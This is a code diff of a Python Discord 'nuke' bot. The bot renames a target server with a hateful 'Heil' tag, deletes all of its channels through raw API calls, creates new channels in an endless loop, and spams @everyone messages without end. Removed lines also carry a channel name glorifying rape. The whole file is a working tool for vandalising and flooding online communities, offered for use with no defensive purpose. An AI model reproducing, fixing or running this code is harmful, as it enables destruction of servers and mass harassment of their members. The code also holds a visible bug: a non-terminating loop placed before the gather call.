@@ -1,13 +1,12 @@
-import discord, os, colorama, asyncio, random, json
+import discord, os, colorama, asyncio, random, json, asyncio, aiohttp
 from discord.ext import commands
 from discord import Permissions
 
 token = os.environ['token']
 
-kichi = commands.Bot(command_prefix="x!", intents = discord.Intents.all())
+kichi = commands.Bot(command_prefix="$", intents = discord.Intents.all())
 
-
-    
+headers = {"Authorization": f"Bot {token}"}
 
 
 yoromo = input("Guild ID: ")
@@ -15,11 +14,8 @@ yoromo = input("Guild ID: ")
   
 
 
-channel_names = "praise tinkgy"
+channel_names = "Heil Tinkgy"
 
-channel_names2 = "Heil rmr"
-
-channel_names3 = "raped by rmr"
 
 messege_spam = "@everyone Nuked By RmR Stay Safe My fellow Freinds https://media.discordapp.net/attachments/1128776132402094163/1129425411659530300/2023-06-15_1688614963804.mp4"
 
@@ -94,25 +90,28 @@ async def rolespam(ctx):
 
 
 
+
 @kichi.command()
 async def nuke(ctx):
-  await ctx.guild.edit(name="Nuked By 𝑹𝑴𝑹 AND NA // Heil Tinkgy Praise")
-  channels = ctx.guild.channels
-  for channel in channels:
-    try:
-      await channel.delete()
-    except:
-       pass
-  while True:
-                              await ctx.guild.create_text_channel(channel_names)
-                               
-                              await ctx.guild.create_text_channel(channel_names2)                           
-                              await ctx.guild.create_text_channel(channel_names3)
+  guild = ctx.guild
+  try:
+    await guild.edit(name='Nuked By Tinkgy | Heil RMR and Noah')
+  except Exception as e:
+    print(f"Failed to edit server name: {str(e)}")
+    pass
+  tasks = []
+  async with aiohttp.ClientSession() as session:
+    for channel in ctx.guild.channels:
+        tasks.append(asyncio.create_task(session.delete(f'https://discord.com/api/channels/{channel.id}', headers=headers)))
+    while True:
+        tasks.append(asyncio.create_task(session.post(f'https://discord.com/api/guilds/{ctx.guild.id}/channels', json={'name':channel_names}, headers=headers)))
+    await asyncio.gather(*tasks)
                                             
    
 
 @kichi.event
 async def on_guild_channel_create(channel):
+    while True:
      await channel.send(messege_spam)
   
 
